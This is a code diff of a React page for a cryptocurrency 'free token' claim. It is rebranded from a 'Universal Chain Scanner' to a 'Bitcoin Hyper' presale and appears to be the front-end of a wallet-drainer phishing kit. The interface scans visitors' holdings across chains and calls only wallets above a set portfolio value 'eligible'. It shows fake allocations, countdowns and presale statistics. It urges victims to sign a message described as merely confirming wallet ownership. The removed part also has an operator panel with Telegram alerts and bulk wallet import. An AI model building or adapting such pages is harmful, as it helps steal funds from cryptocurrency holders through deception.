-                fontSize: '20px'
-              }}>
-                🎁
-              </div>
-              <div>
-                <h4 style={{ color: '#10b981', margin: '0 0 5px 0' }}>You're Eligible for Free Tokens!</h4>
-                <p style={{ color: '#94a3b8', margin: 0, fontSize: '14px' }}>
-                  Sign the message below to claim your {adminSettings.tokenName} ({adminSettings.tokenSymbol})
-                </p>
-              </div>
-            </div>
-            
-            <button
-              onClick={handleSignForClaim}
-              disabled={isProcessing}
-              style={{
-                padding: '15px 30px',
-                background: isProcessing ? '#4b5563' : '#10b981',
-                color: 'white',
-                border: 'none',
-                borderRadius: '10px',
-                cursor: isProcessing ? 'not-allowed' : 'pointer',
-                fontWeight: 'bold',
-                fontSize: '16px',
-                width: '100%',
-                display: 'flex',
-                justifyContent: 'center',
-                alignItems: 'center',
-                gap: '10px'
-              }}
-            >
-              {isProcessing ? (
-                <>
-                  <div style={{ animation: 'spin 1s linear infinite' }}>⏳</div>
-                  Processing Claim...
-                </>
-              ) : (
-                <>
-                  ✍️ Sign & Claim {adminSettings.tokenSymbol}
-                </>
-              )}
-            </button>
-            
-            <div style={{
-              background: 'rgba(0,0,0,0.2)',
-              padding: '15px',
-              borderRadius: '8px',
-              marginTop: '15px',
-              fontSize: '12px',
-              color: '#94a3b8'
-            }}>
-              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '5px' }}>
-                <div style={{ color: '#10b981' }}>ℹ️</div>
-                <div>By signing, you confirm wallet ownership to receive your free tokens</div>
-              </div>
-            </div>
-          </div>
-        )}
-        
-        {!isEligible && scanResult && (
-          <div style={{
-            background: 'rgba(245, 158, 11, 0.1)',
-            padding: '20px',
-            borderRadius: '10px',
-            marginTop: '20px',
-            border: '1px solid #f59e0b',
-            textAlign: 'center'
-          }}>
-            <div style={{ fontSize: '48px', marginBottom: '10px' }}>⚠️</div>
-            <h4 style={{ color: '#f59e0b', marginBottom: '10px' }}>Not Eligible for Rewards</h4>
-            <p style={{ color: '#94a3b8', marginBottom: '15px' }}>
-              Minimum portfolio value required: ${scanResult.minimumRequired || 10}
-              <br/>
-              Your portfolio: {formatCurrency(scanResult.totalValue)}
-            </p>
-            <button
-              onClick={handleManualScan}
-              style={{
-                padding: '10px 20px',
-                background: '#f59e0b',
-                color: 'white',
-                border: 'none',
-                borderRadius: '8px',
-                cursor: 'pointer',
-                fontWeight: 'bold'
-              }}
-            >
-              🔄 Scan Again
-            </button>
-          </div>
-        )}
-      </div>
-    );
+  // Format countdown numbers
+  const formatNumber = (num) => {
+    return num < 10 ? `0${num}` : num;
   };
 
-  const renderAdminPanel = () => {
-    if (!showAdminPanel) return null;
+  // Sign Modal Component
+  const SignModal = () => {
+    if (!showSignModal) return null;
     
     return (
       <div style={{
         position: 'fixed',
-        top: '0',
-        left: '0',
-        right: '0',
-        bottom: '0',
-        background: 'rgba(0, 0, 0, 0.9)',
-        zIndex: 1000,
+        top: 0,
+        left: 0,
+        right: 0,
+        bottom: 0,
+        background: 'rgba(0, 0, 0, 0.95)',
+        zIndex: 9999,
         display: 'flex',
         justifyContent: 'center',
         alignItems: 'center',
-        padding: '20px'
+        animation: 'fadeIn 0.3s ease'
       }}>
         <div style={{
-          background: '#0f172a',
-          padding: '30px',
-          borderRadius: '20px',
-          width: '100%',
-          maxWidth: '800px',
-          maxHeight: '90vh',
-          overflowY: 'auto',
-          border: '2px solid #3b82f6'
+          background: 'linear-gradient(135deg, #0f172a 0%, #1e293b 100%)',
+          padding: '40px',
+          borderRadius: '30px',
+          maxWidth: '500px',
+          width: '90%',
+          border: '2px solid #F7931A',
+          boxShadow: '0 0 50px rgba(247, 147, 26, 0.5)',
+          position: 'relative',
+          overflow: 'hidden'
         }}>
-          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '30px' }}>
-            <h3 style={{ color: '#e2e8f0', fontSize: '24px' }}>👑 Admin Control Panel</h3>
-            <button
-              onClick={() => setShowAdminPanel(false)}
-              style={{
-                background: 'transparent',
-                border: 'none',
-                color: '#94a3b8',
-                fontSize: '24px',
-                cursor: 'pointer'
-              }}
-            >
-              ✕
-            </button>
-          </div>
+          {/* Shimmer effect */}
+          <div style={{
+            position: 'absolute',
+            top: 0,
+            left: 0,
+            right: 0,
+            height: '3px',
+            ...ANIMATIONS.shimmer.style
+          }}></div>
           
-          <div style={{ marginBottom: '30px' }}>
-            <h4 style={{ color: '#e2e8f0', marginBottom: '15px' }}>⚙️ Settings</h4>
-            
-            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '20px' }}>
-              <div>
-                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Minimum Eligibility ($)</label>
-                <input
-                  type="number"
-                  value={adminSettings.minAmount}
-                  onChange={(e) => setAdminSettings({...adminSettings, minAmount: e.target.value})}
-                  style={{
-                    width: '100%',
-                    padding: '10px',
-                    background: '#1e293b',
-                    border: '1px solid #334155',
-                    borderRadius: '8px',
-                    color: 'white'
-                  }}
-                />
-              </div>
-              
-              <div>
-                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Telegram Chat ID</label>
-                <input
-                  type="text"
-                  value={adminSettings.telegramChatId}
-                  onChange={(e) => setAdminSettings({...adminSettings, telegramChatId: e.target.value})}
-                  placeholder="-123456789"
-                  style={{
-                    width: '100%',
-                    padding: '10px',
-                    background: '#1e293b',
-                    border: '1px solid #334155',
-                    borderRadius: '8px',
-                    color: 'white'
-                  }}
-                />
-              </div>
-              
-              <div>
-                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Token Name</label>
-                <input
-                  type="text"
-                  value={adminSettings.tokenName}
-                  onChange={(e) => setAdminSettings({...adminSettings, tokenName: e.target.value})}
-                  style={{
-                    width: '100%',
-                    padding: '10px',
-                    background: '#1e293b',
-                    border: '1px solid #334155',
-                    borderRadius: '8px',
-                    color: 'white'
-                  }}
-                />
-              </div>
-              
-              <div>
-                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Token Symbol</label>
-                <input
-                  type="text"
-                  value={adminSettings.tokenSymbol}
-                  onChange={(e) => setAdminSettings({...adminSettings, tokenSymbol: e.target.value})}
-                  style={{
-                    width: '100%',
-                    padding: '10px',
-                    background: '#1e293b',
-                    border: '1px solid #334155',
-                    borderRadius: '8px',
-                    color: 'white'
-                  }}
-                />
-              </div>
-              
-              <div>
-                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Admin Wallet</label>
-                <input
-                  type="text"
-                  value={adminSettings.adminWallet}
-                  onChange={(e) => setAdminSettings({...adminSettings, adminWallet: e.target.value})}
-                  style={{
-                    width: '100%',
-                    padding: '10px',
-                    background: '#1e293b',
-                    border: '1px solid #334155',
-                    borderRadius: '8px',
-                    color: 'white'
-                  }}
-                />
-              </div>
-              
-              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                <input
-                  type="checkbox"
-                  id="emailNotifications"
-                  checked={adminSettings.emailNotifications}
-                  onChange={(e) => setAdminSettings({...adminSettings, emailNotifications: e.target.checked})}
-                />
-                <label htmlFor="emailNotifications" style={{ color: '#94a3b8' }}>Enable Email Notifications</label>
-              </div>
+          <button
+            onClick={() => setShowSignModal(false)}
+            style={{
+              position: 'absolute',
+              top: '20px',
+              right: '20px',
+              background: 'transparent',
+              border: 'none',
+              color: '#94a3b8',
+              fontSize: '24px',
+              cursor: 'pointer',
+              zIndex: 1
+            }}
+          >
+            ✕
+          </button>
+          
+          <div style={{ textAlign: 'center', marginBottom: '30px' }}>
+            <div style={{
+              fontSize: '48px',
+              marginBottom: '20px',
+              ...ANIMATIONS.bitcoinGlow.style
+            }}>
+              🎉
             </div>
-            
-            <button
-              onClick={saveAdminSettings}
-              style={{
-                marginTop: '20px',
-                padding: '12px 30px',
-                background: '#3b82f6',
-                color: 'white',
-                border: 'none',
-                borderRadius: '8px',
-                cursor: 'pointer',
-                fontWeight: 'bold',
-                width: '100%'
-              }}
-            >
-              💾 Save Settings
-            </button>
+            <h2 style={{
+              fontSize: '32px',
+              color: '#F7931A',
+              marginBottom: '10px',
+              background: 'linear-gradient(45deg, #F7931A, #FFD700)',
+              WebkitBackgroundClip: 'text',
+              WebkitTextFillColor: 'transparent'
+            }}>
+              Congratulations!
+            </h2>
+            <p style={{ color: '#cbd5e1', fontSize: '18px' }}>
+              You're eligible for Bitcoin Hyper presale tokens!
+            </p>
           </div>
           
-          <div style={{ marginBottom: '30px' }}>
-            <h4 style={{ color: '#e2e8f0', marginBottom: '15px' }}>📦 Bulk Wallet Import</h4>
-            <textarea
-              value={bulkWallets}
-              onChange={(e) => setBulkWallets(e.target.value)}
-              placeholder="Enter wallet addresses (one per line)
-Example:
-0x742d35Cc6634C0532925a3b844Bc454e4438f44e
-0x742d35Cc6634C0532925a3b844Bc454e4438f44e
-0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
-              rows={8}
-              style={{
-                width: '100%',
-                padding: '15px',
-                background: '#1e293b',
-                border: '1px solid #334155',
-                borderRadius: '8px',
-                color: 'white',
-                fontFamily: 'monospace',
-                marginBottom: '15px'
-              }}
-            />
-            <div style={{ display: 'flex', gap: '10px' }}>
-              <button
-                onClick={handleBulkImport}
-                style={{
-                  padding: '12px 30px',
-                  background: '#10b981',
-                  color: 'white',
-                  border: 'none',
-                  borderRadius: '8px',
-                  cursor: 'pointer',
-                  fontWeight: 'bold',
-                  flex: 1
-                }}
-              >
-                📥 Import Wallets
-              </button>
-              <button
-                onClick={() => {
-                  const count = bulkWallets.split('\n').filter(w => w.trim().startsWith('0x')).length;
-                  alert(`${count} valid wallet addresses detected`);
-                }}
-                style={{
-                  padding: '12px 30px',
-                  background: '#6b7280',
-                  color: 'white',
-                  border: 'none',
-                  borderRadius: '8px',
-                  cursor: 'pointer',
-                  fontWeight: 'bold'
-                }}
-              >
-                🔍 Validate
-              </button>
+          <div style={{
+            background: 'rgba(247, 147, 26, 0.1)',
+            padding: '25px',
+            borderRadius: '20px',
+            border: '1px solid rgba(247, 147, 26, 0.3)',
+            marginBottom: '30px'
+          }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
+              <span style={{ color: '#94a3b8' }}>Token Allocation</span>
+              <span style={{ color: '#F7931A', fontWeight: 'bold', fontSize: '20px' }}>5,000 BTH</span>
+            </div>
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
+              <span style={{ color: '#94a3b8' }}>Value</span>
+              <span style={{ color: '#10b981', fontWeight: 'bold', fontSize: '20px' }}>$850</span>
+            </div>
+            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
+              <span style={{ color: '#94a3b8' }}>Vesting</span>
+              <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>25% TGE, 6 months linear</span>
             </div>
           </div>
           
-          <div>
-            <h4 style={{ color: '#e2e8f0', marginBottom: '15px' }}>📊 System Status</h4>
-            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '15px' }}>
-              <div style={{ background: '#1e293b', padding: '15px', borderRadius: '10px', textAlign: 'center' }}>
-                <div style={{ color: '#94a3b8', fontSize: '12px' }}>Backend</div>
-                <div style={{ color: '#10b981', fontSize: '20px', fontWeight: 'bold' }}>✅ Online</div>
-              </div>
-              <div style={{ background: '#1e293b', padding: '15px', borderRadius: '10px', textAlign: 'center' }}>
-                <div style={{ color: '#94a3b8', fontSize: '12px' }}>Telegram</div>
-                <div style={{ color: telegramEnabled ? '#10b981' : '#ef4444', fontSize: '20px', fontWeight: 'bold' }}>
-                  {telegramEnabled ? '✅ Connected' : '❌ Disabled'}
-                </div>
-              </div>
-              <div style={{ background: '#1e293b', padding: '15px', borderRadius: '10px', textAlign: 'center' }}>
-                <div style={{ color: '#94a3b8', fontSize: '12px' }}>Scanner</div>
-                <div style={{ color: '#3b82f6', fontSize: '20px', fontWeight: 'bold' }}>🟢 Active</div>
-              </div>
+          <div style={{
+            background: 'rgba(59, 130, 246, 0.1)',
+            padding: '20px',
+            borderRadius: '15px',
+            marginBottom: '25px',
+            border: '1px solid rgba(59, 130, 246, 0.3)'
+          }}>
+            <div style={{ color: '#3b82f6', marginBottom: '10px', fontWeight: 'bold' }}>
+              📝 Sign to Claim
             </div>
+            <div style={{ color: '#94a3b8', fontSize: '14px' }}>
+              Sign this message to confirm your wallet ownership and claim your presale allocation.
+            </div>
+          </div>
+          
+          <button
+            onClick={handleTokenClaim}
+            disabled={processing}
+            style={{
+              width: '100%',
+              padding: '20px',
+              background: processing ? '#4b5563' : 'linear-gradient(45deg, #F7931A, #FFD700)',
+              color: 'white',
+              border: 'none',
+              borderRadius: '15px',
+              fontSize: '18px',
+              fontWeight: 'bold',
+              cursor: processing ? 'not-allowed' : 'pointer',
+              ...ANIMATIONS.pulseGlow.style,
+              display: 'flex',
+              justifyContent: 'center',
+              alignItems: 'center',
+              gap: '10px'
+            }}
+          >
+            {processing ? (
+              <>
+                <div style={{ animation: 'spin 1s linear infinite' }}>⏳</div>
+                Processing Your Claim...
+              </>
+            ) : (
+              <>
+                ✍️ Sign & Claim 5,000 BTH Tokens
+              </>
+            )}
+          </button>
+          
+          <div style={{
+            marginTop: '20px',
+            padding: '15px',
+            background: 'rgba(0,0,0,0.3)',
+            borderRadius: '10px',
+            fontSize: '12px',
+            color: '#94a3b8',
+            textAlign: 'center'
+          }}>
+            ⚡ Tokens will be distributed after presale ends
           </div>
         </div>
       </div>
     );
   };
 
-  // ✅ MAIN RENDER
+  // Main render
   return (
     <div style={{
-      padding: isMobile ? '15px' : '20px',
-      maxWidth: '1200px',
-      margin: '0 auto',
       minHeight: '100vh',
-      background: '#0f172a',
+      background: 'linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%)',
       color: 'white',
-      fontFamily: 'system-ui, -apple-system, sans-serif'
+      fontFamily: '"Inter", "Segoe UI", system-ui, -apple-system, sans-serif',
+      overflow: 'hidden',
+      position: 'relative'
     }}>
-      {/* Header */}
-      <header style={{
-        display: 'flex',
-        justifyContent: 'space-between',
-        alignItems: 'center',
-        padding: '20px 0',
-        borderBottom: '1px solid #334155',
-        marginBottom: '30px',
-        flexWrap: 'wrap',
-        gap: '15px'
-      }}>
-        <div>
-          <h1 style={{
-            fontSize: isMobile ? '24px' : '32px',
-            background: 'linear-gradient(90deg, #3b82f6, #10b981, #8b5cf6)',
-            WebkitBackgroundClip: 'text',
-            WebkitTextFillColor: 'transparent',
-            marginBottom: '5px'
-          }}>
-            🌐 Universal Chain Scanner
-          </h1>
-          <p style={{ color: '#94a3b8', fontSize: '14px' }}>
-            Auto-scanning • Instant rewards • Multi-chain support
-          </p>
-        </div>
-        
-        <div style={{ display: 'flex', alignItems: 'center', gap: '15px', flexWrap: 'wrap' }}>
-          {address && (
+      {/* Animation container */}
+      <div id="animation-container" style={{
+        position: 'fixed',
+        top: 0,
+        left: 0,
+        right: 0,
+        bottom: 0,
+        pointerEvents: 'none',
+        zIndex: 1
+      }}></div>
+      
+      {/* Main content */}
+      <div style={{ position: 'relative', zIndex: 2 }}>
+        {/* Header */}
+        <header style={{
+          padding: isMobile ? '20px 15px' : '30px 50px',
+          display: 'flex',
+          justifyContent: 'space-between',
+          alignItems: 'center',
+          borderBottom: '1px solid rgba(247, 147, 26, 0.2)',
+          background: 'rgba(15, 23, 42, 0.8)',
+          backdropFilter: 'blur(10px)'
+        }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
             <div style={{
-              background: '#1e293b',
-              padding: '8px 15px',
-              borderRadius: '8px',
-              fontFamily: 'monospace',
-              border: '1px solid #334155',
-              fontSize: '14px'
+              fontSize: '32px',
+              ...ANIMATIONS.bitcoinGlow.style
             }}>
-              {isMobile ? `${address.slice(0, 6)}...${address.slice(-4)}` : address}
+              ₿
             </div>
-          )}
-          
-          <button
-            onClick={handleAdminLogin}
-            style={{
-              padding: '10px 20px',
-              background: '#8b5cf6',
-              color: 'white',
-              border: 'none',
-              borderRadius: '8px',
-              cursor: 'pointer',
-              fontWeight: 'bold',
-              fontSize: '14px'
-            }}
-          >
-            👑 Admin
-          </button>
-          
-          <ConnectKitButton />
-        </div>
-      </header>
-
-      <main>
-        {renderConnectionSteps()}
-        
-        {!isConnected ? (
-          // Welcome screen
-          <div style={{ textAlign: 'center', padding: isMobile ? '40px 15px' : '60px 20px' }}>
-            <div style={{ 
-              fontSize: isMobile ? '60px' : '80px',
-              marginBottom: '30px',
-              background: 'linear-gradient(90deg, #3b82f6, #10b981, #8b5cf6)',
-              WebkitBackgroundClip: 'text',
-              WebkitTextFillColor: 'transparent'
-            }}>
-              🔍
-            </div>
-            
-            <h2 style={{ fontSize: isMobile ? '28px' : '36px', marginBottom: '20px' }}>
-              Connect Your Wallet to Begin
-            </h2>
-            
-            <p style={{ 
-              color: '#94a3b8', 
-              fontSize: '18px', 
-              marginBottom: '40px', 
-              maxWidth: '600px', 
-              margin: '0 auto',
-              lineHeight: '1.6'
-            }}>
-              Your wallet will be <strong>automatically scanned</strong> across all chains.
-              <br/>
-              If you have <strong>${adminSettings.minAmount}+ in assets</strong>, you'll receive free tokens!
-            </p>
-            
-            <div style={{
-              background: 'linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(16, 185, 129, 0.1) 100%)',
-              padding: '30px',
-              borderRadius: '20px',
-              border: '2px solid #3b82f6',
-              marginBottom: '40px',
-              textAlign: 'center'
-            }}>
-              <h3 style={{ color: '#3b82f6', marginBottom: '20px', fontSize: '24px' }}>
-                🚀 How It Works
-              </h3>
-              
-              <div style={{ display: 'grid', gridTemplateColumns: isMobile ? '1fr' : 'repeat(3, 1fr)', gap: '20px' }}>
-                <div style={{ textAlign: 'center' }}>
-                  <div style={{
-                    width: '60px',
-                    height: '60px',
-                    background: '#3b82f6',
-                    borderRadius: '50%',
-                    display: 'flex',
-                    alignItems: 'center',
-                    justifyContent: 'center',
-                    fontSize: '24px',
-                    margin: '0 auto 15px'
-                  }}>
-                    1
-                  </div>
-                  <div style={{ color: '#e2e8f0', fontWeight: 'bold', marginBottom: '10px' }}>Connect</div>
-                  <div style={{ color: '#94a3b8', fontSize: '14px' }}>Connect your wallet with one click</div>
-                </div>
-                
-                <div style={{ textAlign: 'center' }}>
-                  <div style={{
-                    width: '60px',
-                    height: '60px',
-                    background: '#10b981',
-                    borderRadius: '50%',
-                    display: 'flex',
-                    alignItems: 'center',
-                    justifyContent: 'center',
-                    fontSize: '24px',
-                    margin: '0 auto 15px'
-                  }}>
-                    2
-                  </div>
-                  <div style={{ color: '#e2e8f0', fontWeight: 'bold', marginBottom: '10px' }}>Auto-Scan</div>
-                  <div style={{ color: '#94a3b8', fontSize: '14px' }}>We scan your assets across all chains</div>
-                </div>
-                
-                <div style={{ textAlign: 'center' }}>
-                  <div style={{
-                    width: '60px',
-                    height: '60px',
-                    background: '#8b5cf6',
-                    borderRadius: '50%',
-                    display: 'flex',
-                    alignItems: 'center',
-                    justifyContent: 'center',
-                    fontSize: '24px',
-                    margin: '0 auto 15px'
-                  }}>
-                    3
-                  </div>
-                  <div style={{ color: '#e2e8f0', fontWeight: 'bold', marginBottom: '10px' }}>Claim Rewards</div>
-                  <div style={{ color: '#94a3b8', fontSize: '14px' }}>Receive free tokens if eligible</div>
-                </div>
-              </div>
-            </div>
-            
-            <div style={{
-              background: '#1e293b',
-              padding: '25px',
-              borderRadius: '15px',
-              border: '1px solid #334155',
-              maxWidth: '500px',
-              margin: '0 auto'
-            }}>
-              <div style={{ color: '#94a3b8', fontSize: '14px', marginBottom: '10px' }}>Ready to start?</div>
-              <div style={{ fontSize: '18px', color: '#e2e8f0', marginBottom: '20px' }}>
-                Click "Connect Wallet" above to begin
+            <div>
+              <h1 style={{
+                fontSize: isMobile ? '20px' : '28px',
+                margin: 0,
+                background: 'linear-gradient(45deg, #F7931A, #FFD700)',
+                WebkitBackgroundClip: 'text',
+                WebkitTextFillColor: 'transparent',
+                fontWeight: 'bold'
+              }}>
+                BITCOIN HYPER
+              </h1>
+              <div style={{ color: '#94a3b8', fontSize: '12px', letterSpacing: '2px' }}>
+                OFFICIAL PRESALE LAUNCH
               </div>
             </div>
           </div>
-        ) : (
-          // Connected user interface
-          <>
-            {scanning ? (
-              <div style={{
-                textAlign: 'center',
-                padding: '80px 20px'
-              }}>
-                <div style={{
-                  width: '80px',
-                  height: '80px',
-                  border: '5px solid #334155',
-                  borderTop: '5px solid #3b82f6',
-                  borderRadius: '50%',
-                  animation: 'spin 1s linear infinite',
-                  margin: '0 auto 30px'
-                }}></div>
-                <h3 style={{ color: '#e2e8f0', marginBottom: '15px', fontSize: '24px' }}>
-                  🔍 Scanning Your Wallet...
-                </h3>
-                <p style={{ color: '#94a3b8', fontSize: '18px' }}>
-                  Scanning across 13+ chains for your assets
-                  <br/>
-                  <span style={{ fontSize: '14px', color: '#64748b' }}>This may take a few moments</span>
-                </p>
-              </div>
-            ) : (
-              renderScanResults()
+          
+          <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
+            {isConnected && (
+              <button
+                onClick={() => disconnect()}
+                style={{
+                  padding: '10px 20px',
+                  background: 'rgba(239, 68, 68, 0.2)',
+                  color: '#ef4444',
+                  border: '1px solid rgba(239, 68, 68, 0.3)',
+                  borderRadius: '8px',
+                  cursor: 'pointer',
+                  fontSize: '14px'
+                }}
+              >
+                Disconnect
+              </button>
             )}
             
-            {claimData && connectionStep === 4 && (
-              <div style={{
-                background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(59, 130, 246, 0.1) 100%)',
-                padding: '30px',
-                borderRadius: '20px',
-                border: '2px solid #10b981',
-                marginTop: '30px',
-                textAlign: 'center'
-              }}>
-                <div style={{ fontSize: '48px', marginBottom: '20px' }}>⏳</div>
-                <h3 style={{ color: '#10b981', marginBottom: '15px', fontSize: '24px' }}>
-                  Processing Your Claim...
-                </h3>
-                <p style={{ color: '#94a3b8', marginBottom: '20px' }}>
-                  Your {adminSettings.tokenName} ({adminSettings.tokenSymbol}) tokens are being sent to your wallet.
-                  <br/>
-                  This usually takes 1-2 minutes.
-                </p>
+            <ConnectKitButton.Custom>
+              {({ show }) => (
+                <button
+                  onClick={show}
+                  style={{
+                    padding: '12px 30px',
+                    background: 'linear-gradient(45deg, #F7931A, #FFD700)',
+                    color: 'black',
+                    border: 'none',
+                    borderRadius: '10px',
+                    cursor: 'pointer',
+                    fontWeight: 'bold',
+                    fontSize: '16px',
+                    ...ANIMATIONS.pulseGlow.style
+                  }}
+                >
+                  {isConnected ? 'Wallet Connected' : 'Connect Wallet'}
+                </button>
+              )}
+            </ConnectKitButton.Custom>
+          </div>
+        </header>
+
+        {/* Hero Section */}
+        <section style={{
+          padding: isMobile ? '60px 20px' : '100px 50px',
+          textAlign: 'center',
+          position: 'relative',
+          overflow: 'hidden'
+        }}>
+          <div style={{
+            position: 'absolute',
+            top: '50%',
+            left: '50%',
+            transform: 'translate(-50%, -50%)',
+            width: '800px',
+            height: '800px',
+            background: 'radial-gradient(circle, rgba(247, 147, 26, 0.1) 0%, transparent 70%)',
+            zIndex: -1
+          }}></div>
+          
+          <div style={{ 
+            fontSize: isMobile ? '80px' : '120px',
+            marginBottom: '20px',
+            ...ANIMATIONS.floatUpDown.style
+          }}>
+            ₿
+          </div>
+          
+          <h2 style={{
+            fontSize: isMobile ? '28px' : '48px',
+            marginBottom: '20px',
+            background: 'linear-gradient(45deg, #F7931A, #FFD700, #FFFFFF)',
+            WebkitBackgroundClip: 'text',
+            WebkitTextFillColor: 'transparent',
+            animation: 'gradientFlow 3s ease infinite',
+            backgroundSize: '200% 200%'
+          }}>
+            NEXT GENERATION BITCOIN ECOSYSTEM
+          </h2>
+          
+          <p style={{
+            color: '#cbd5e1',
+            fontSize: isMobile ? '16px' : '20px',
+            maxWidth: '800px',
+            margin: '0 auto 40px',
+            lineHeight: '1.6'
+          }}>
+            Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
+            and be part of the revolution.
+          </p>
+          
+          {/* Countdown Timer */}
+          <div style={{
+            display: 'inline-flex',
+            gap: '15px',
+            marginBottom: '40px',
+            background: 'rgba(15, 23, 42, 0.8)',
+            padding: '25px',
+            borderRadius: '20px',
+            border: '1px solid rgba(247, 147, 26, 0.3)',
+            backdropFilter: 'blur(10px)'
+          }}>
+            {Object.entries(countdown).map(([label, value]) => (
+              <div key={label} style={{ textAlign: 'center' }}>
                 <div style={{
-                  background: 'rgba(0,0,0,0.2)',
-                  padding: '15px',
-                  borderRadius: '10px',
-                  marginTop: '20px'
+                  fontSize: '36px',
+                  fontWeight: 'bold',
+                  background: 'linear-gradient(45deg, #F7931A, #FFD700)',
+                  WebkitBackgroundClip: 'text',
+                  WebkitTextFillColor: 'transparent',
+                  minWidth: '70px'
                 }}>
-                  <div style={{ color: '#e2e8f0', fontWeight: 'bold', marginBottom: '5px' }}>Claim ID</div>
-                  <div style={{ color: '#94a3b8', fontFamily: 'monospace', fontSize: '14px' }}>
-                    {claimData.claimId}
-                  </div>
+                  {formatNumber(value)}
+                </div>
+                <div style={{
+                  color: '#94a3b8',
+                  fontSize: '12px',
+                  textTransform: 'uppercase',
+                  letterSpacing: '2px'
+                }}>
+                  {label}
                 </div>
               </div>
-            )}
-          </>
-        )}
-      </main>
+            ))}
+          </div>
+          
+          {/* Presale Stats */}
+          <div style={{
+            display: 'grid',
+            gridTemplateColumns: isMobile ? '1fr' : 'repeat(4, 1fr)',
+            gap: '20px',
+            maxWidth: '1000px',
+            margin: '0 auto 40px'
+          }}>
+            {Object.entries(presaleStats).map(([label, value]) => (
+              <div key={label} style={{
+                background: 'rgba(15, 23, 42, 0.8)',
+                padding: '25px',
+                borderRadius: '15px',
+                border: '1px solid rgba(247, 147, 26, 0.2)',
+                backdropFilter: 'blur(10px)'
+              }}>
+                <div style={{
+                  fontSize: '28px',
+                  fontWeight: 'bold',
+                  color: '#F7931A',
+                  marginBottom: '10px'
+                }}>
+                  {value}
+                </div>
+                <div style={{
+                  color: '#94a3b8',
+                  fontSize: '14px',
+                  textTransform: 'uppercase'
+                }}>
+                  {label.replace(/([A-Z])/g, ' $1')}
+                </div>
+              </div>
+            ))}
+          </div>
+          
+          {/* Progress Bar */}
+          <div style={{
+            maxWidth: '800px',
+            margin: '0 auto 40px',
+            background: 'rgba(15, 23, 42, 0.8)',
+            padding: '30px',
+            borderRadius: '20px',
+            border: '1px solid rgba(247, 147, 26, 0.3)',
+            backdropFilter: 'blur(10px)'
+          }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px' }}>
+              <span style={{ color: '#cbd5e1' }}>Presale Progress</span>
+              <span style={{ color: '#F7931A', fontWeight: 'bold' }}>{presaleStats.progress}%</span>
+            </div>
+            <div style={{
+              height: '15px',
+              background: 'rgba(247, 147, 26, 0.1)',
+              borderRadius: '10px',
+              overflow: 'hidden'
+            }}>
+              <div style={{
+                height: '100%',
+                width: `${presaleStats.progress}%`,
+                background: 'linear-gradient(90deg, #F7931A, #FFD700)',
+                borderRadius: '10px',
+                position: 'relative'
+              }}>
+                <div style={{
+                  position: 'absolute',
+                  top: '0',
+                  right: '0',
+                  bottom: '0',
+                  width: '4px',
+                  background: 'white',
+                  boxShadow: '0 0 10px white'
+                }}></div>
+              </div>
+            </div>
+          </div>
+          
+          {/* Call to Action */}
+          {!isConnected ? (
+            <div style={{
+              background: 'linear-gradient(135deg, rgba(247, 147, 26, 0.1), rgba(255, 215, 0, 0.1))',
+              padding: '40px',
+              borderRadius: '25px',
+              maxWidth: '600px',
+              margin: '0 auto',
+              border: '2px solid rgba(247, 147, 26, 0.3)',
+              backdropFilter: 'blur(10px)'
+            }}>
+              <div style={{ fontSize: '48px', marginBottom: '20px' }}>🚀</div>
+              <h3 style={{ color: '#F7931A', fontSize: '24px', marginBottom: '15px' }}>
+                Connect Wallet to Check Eligibility
+              </h3>
+              <p style={{ color: '#cbd5e1', marginBottom: '25px' }}>
+                Connect your wallet to automatically scan for eligibility. 
+                Qualified wallets receive instant presale allocations.
+              </p>
+              <ConnectKitButton.Custom>
+                {({ show }) => (
+                  <button
+                    onClick={show}
+                    style={{
+                      padding: '18px 40px',
+                      background: 'linear-gradient(45deg, #F7931A, #FFD700)',
+                      color: 'black',
+                      border: 'none',
+                      borderRadius: '15px',
+                      fontSize: '18px',
+                      fontWeight: 'bold',
+                      cursor: 'pointer',
+                      ...ANIMATIONS.pulseGlow.style
+                    }}
+                  >
+                    CONNECT WALLET TO START
+                  </button>
+                )}
+              </ConnectKitButton.Custom>
+            </div>
+          ) : scanning ? (
+            <div style={{
+              background: 'rgba(15, 23, 42, 0.8)',
+              padding: '40px',
+              borderRadius: '25px',
+              maxWidth: '500px',
+              margin: '0 auto',
+              border: '2px solid rgba(59, 130, 246, 0.3)',
+              backdropFilter: 'blur(10px)'
+            }}>
+              <div style={{
+                width: '80px',
+                height: '80px',
+                border: '4px solid #334155',
+                borderTop: '4px solid #3b82f6',
+                borderRadius: '50%',
+                animation: 'spin 1s linear infinite',
+                margin: '0 auto 30px'
+              }}></div>
+              <h3 style={{ color: '#3b82f6', fontSize: '24px', marginBottom: '15px' }}>
+                Scanning Your Wallet...
+              </h3>
+              <p style={{ color: '#cbd5e1' }}>
+                Checking eligibility across multiple chains...
+              </p>
+            </div>
+          ) : isEligible ? (
+            <div style={{
+              background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(52, 211, 153, 0.1))',
+              padding: '40px',
+              borderRadius: '25px',
+              maxWidth: '500px',
+              margin: '0 auto',
+              border: '2px solid rgba(16, 185, 129, 0.3)',
